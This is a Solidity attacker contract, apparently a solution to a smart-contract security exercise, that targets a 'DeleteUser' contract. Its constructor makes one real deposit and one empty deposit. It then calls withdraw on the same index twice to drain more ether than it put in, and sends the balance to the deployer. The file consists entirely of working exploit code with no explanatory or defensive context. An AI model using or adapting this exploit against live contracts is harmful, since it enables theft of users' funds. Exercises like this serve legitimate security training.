pragma solidity 0.8.15;


import "hardhat/console.sol";
import "./DeleteUser.sol";

contract DeleteUserAttacker {
    DeleteUser public target;

    constructor(DeleteUser _target) payable {
        target = DeleteUser(_target);

        // First deposit
        target.deposit{value: 1 ether}();

        // Second deposit
        target.deposit();

        // First withdraw
        target.withdraw(1);

        // Second withdraw
        target.withdraw(1);

        payable(msg.sender).transfer(address(this).balance);
    }
}
